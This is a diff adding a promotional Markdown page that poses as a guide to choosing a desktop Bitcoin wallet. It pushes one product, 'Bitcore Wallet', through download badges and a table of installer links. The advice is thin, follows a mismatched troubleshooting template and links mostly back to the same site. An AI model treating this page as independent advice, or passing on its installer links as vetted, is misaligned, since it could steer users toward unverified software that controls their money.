@@ -1,0 +1,67 @@
+<p align="center"><img src="https://raw.githubusercontent.com/bitcore-projects/learn/main/assets/bitcore-wallet-banner-free-yours.webp" alt="Bitcore Wallet — free Bitcoin desktop wallet" width="100%"></p>
+
+<h1 align="center">Choosing a desktop Bitcoin wallet</h1>
+
+<p align="center">[![Website](https://img.shields.io/badge/website-bitcorewallet.org-F7AD44?style=for-the-badge)](https://bitcorewallet.org/) [![Release](https://img.shields.io/badge/release-v8.25.3-2B2B30?style=for-the-badge&logo=github)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) [![Free](https://img.shields.io/badge/price-free_to_install-F7AD44?style=for-the-badge)](https://bitcorewallet.org/fees) [![Self-custody](https://img.shields.io/badge/self--custody-bitcoin_wallet-2B2B30?style=for-the-badge&logo=bitcoin)](https://bitcorewallet.org/self-custody)</p>
+
+> **Short answer:** Pick a free, self-custody desktop wallet with checksum-verified downloads, clear backups and multisig options.
+
+---
+
+## You'll see this if
+- You compare wallets
+- You want a desktop app
+- You value open source
+
+## Why it happens
+Desktop wallets give more screen space and control than mobile apps. For background, read the [best desktop Bitcoin wallet guide](https://bitcorewallet.org/guides/best-desktop-bitcoin-wallet) on the Bitcore Wallet website, or the related guide [Bitcore Wallet and BitPay Wallet: shared roots, separate products](./bitcore-wallet-vs-bitpay-wallet.md).
+
+## How to fix it
+1. List what you need: multisig, watch-only, fee control.
+2. Check where the download comes from.
+3. Read independent comparisons.
+4. Test with a small amount.
+5. Back up properly.
+
+## If that didn't work
+If no wallet fits, combine one for spending and another setup for savings. You can also check [Bitcore Wallet vs Electrum](https://bitcorewallet.org/vs/electrum) and [What happened to Copay and what to do with old wallets](./copay-wallet-history.md).
+
+## Prevention
+Re-evaluate when your needs change. The [Bitcore Wallet vs Sparrow](https://bitcorewallet.org/vs/sparrow) has more detail.
+
+> [!WARNING]
+> Never type your recovery phrase into a website, chat or form. Bitcore Wallet support will never ask for it.
+
+## FAQ
+**Is Bitcore Wallet open source based?**  
+It is built on the open-source Bitcore platform.
+
+**Is it free?**  
+Yes.
+
+---
+
+## Get Bitcore Wallet
+
+> [!TIP]
+> Download only from the official release or [bitcorewallet.org](https://bitcorewallet.org/download). Nobody from Bitcore Wallet will ever ask for your recovery phrase.
+
+<p align="center">[![Download for Windows](https://img.shields.io/badge/Download-Windows-F7AD44?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-F7AD44?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-F7AD44?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip)</p>
+
+| Platform | File | Package | Requirements |
+|---|---|---|---|
+| **Windows** | [`bitcore-wallet-v8.25.3.exe`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) | 64-bit EXE installer | Windows 10 or 11, 64-bit |
+| **macOS** | [`bitcore-wallet-v8.25.3.dmg`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) | DMG package | Recent macOS release |
+| **Linux** | [`bitcore-wallet-v8.25.3.zip`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip) | x64 ZIP archive | 64-bit desktop distribution |
+
+Release notes: [Bitcore Wallet v8.25.3 on GitHub](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) · Source: [bitcore-projects/Bitcore-Wallet](https://github.com/bitcore-projects/Bitcore-Wallet)
+
+---
+
+## Related guides
+| Guide | |
+|---|---|
+| [Bitcore Wallet and Electrum: how to choose](./bitcore-wallet-vs-electrum.md) | Bitcore Wallet how-to |
+| [Bitcore Wallet and Sparrow: how to choose](./bitcore-wallet-vs-sparrow.md) | Bitcore Wallet how-to |
+| [Bitcore Wallet and Exodus: Bitcoin-focused vs multi-asset](./bitcore-wallet-vs-exodus.md) | Bitcore Wallet how-to |
+| [All Bitcore Wallet guides](../README.md) | Index |
